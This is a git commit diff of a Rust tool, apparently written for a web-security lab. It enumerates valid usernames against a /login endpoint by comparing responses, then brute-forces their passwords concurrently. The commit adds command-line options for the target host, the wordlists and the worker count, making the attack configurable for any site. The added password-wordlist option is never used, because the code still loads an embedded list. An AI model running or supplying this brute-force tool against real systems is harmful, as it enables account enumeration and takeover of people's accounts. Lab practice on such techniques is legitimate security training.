691b391d6160d4caac50466124267f9e2f049b4a
elaleman <elalemanx@example.com>
2023-04-22 23:19:23 -0300

    add command line arguments

--- username-enumeration-via-different-responses/src/main.rs
+++ username-enumeration-via-different-responses/src/main.rs
@@ -1,32 +1,51 @@
 use async_channel::bounded;
+use clap::Parser;
 use std::{process::exit, sync};
+
+#[derive(Parser, Debug)]
+#[command(author, version, about, long_about = None)]
+struct Args {
+    /// Target host
+    #[clap(short = 'H', long)]
+    host: String,
+
+    /// Path of the users wordlist
+    #[clap(short, long)]
+    users_wordlist: String,
+
+    /// Path of the passwords wordlist
+    #[clap(short, long)]
+    passwords_wordlist: String,
+
+    /// Number of concurrent workers
+    #[clap(short, long, default_value = "10")]
+    concurrency: usize,
+}
 
 #[tokio::main]
 async fn main() {
-    let args = std::env::args().collect::<Vec<_>>();
-    if args.len() != 2 {
-        eprintln!("usage: {} <host>", args[0]);
-        exit(1);
-    }
-    let host = &args[1];
+    let args = Args::parse();
 
-    let users_wordlist = include_str!("../files/users_wordlist.txt")
+    let users_wordlist = tokio::fs::read_to_string(args.users_wordlist)
+        .await
+        .unwrap()
         .lines()
+        .map(|line| line.trim().to_string())
         .collect::<Vec<_>>();
+
     let passwords_wordlist = include_str!("../files/passwords_wordlist.txt")
         .lines()
         .collect::<Vec<_>>();
 
     let valid_users = sync::Arc::new(tokio::sync::Mutex::new(Vec::new()));
 
-    let concurrency = 10;
-    let (user_tx, user_rx) = bounded(1);
-    let url = format!("https://{}/login", host);
+    let (user_tx, user_rx) = bounded::<String>(1);
+    let url = format!("https://{}/login", args.host);
 
     let mut handles = Vec::new();
     let client = reqwest::Client::new();
 
-    for _ in 0..concurrency {
+    for _ in 0..args.concurrency {
         let valid_users = valid_users.clone();
         let user_rx = user_rx.clone();
         let url = url.clone();
@@ -34,9 +53,9 @@ async fn main() {
 
         let handle = tokio::spawn(async move {
             while let Ok(user) = user_rx.recv().await {
-                let params = [("username", user), ("password", "password")];
-
+                let params = [("username", user.as_str()), ("password", "password")];
                 eprintln!("trying user: '{}'", user);
+
                 let mut result = client.post(&url).form(&params).send().await;
 
                 for _retry in 0..3 {
@@ -73,10 +92,9 @@ async fn main() {
         handles.push(handle);
     }
 
-    for user in users_wordlist {
-        user_tx.send(user).await.unwrap();
+    for user in users_wordlist.into_iter() {
+        user_tx.send(user.to_string()).await.unwrap();
     }
-
     user_tx.close();
 
     for handle in handles {
@@ -85,9 +103,9 @@ async fn main() {
 
     // Brute force passwords
 
-    let (user_pass_tx, user_pass_rx) = bounded(1);
+    let (user_pass_tx, user_pass_rx) = bounded::<(String, String)>(1);
 
-    let handles = (0..concurrency)
+    let handles = (0..args.concurrency)
         .map(|_| {
             let user_pass_rx = user_pass_rx.clone();
             let url = url.clone();
@@ -95,7 +113,7 @@ async fn main() {
 
             tokio::spawn(async move {
                 while let Ok((user, password)) = user_pass_rx.recv().await {
-                    let params = [("username", user), ("password", password)];
+                    let params = [("username", user.as_str()), ("password", password.as_str())];
 
                     eprintln!("trying user: '{}' and password: '{}'", user, password);
                     let result = client.post(&url).form(&params).send().await.unwrap();
@@ -115,9 +133,12 @@ async fn main() {
         })
         .collect::<Vec<_>>();
 
-    for &user in valid_users.lock().await.iter() {
-        for &password in passwords_wordlist.iter() {
-            user_pass_tx.send((user, password)).await.unwrap();
+    for user in valid_users.lock().await.iter() {
+        for password in passwords_wordlist.iter() {
+            user_pass_tx
+                .send((user.to_string(), password.to_string()))
+                .await
+                .unwrap();
         }
     }
 
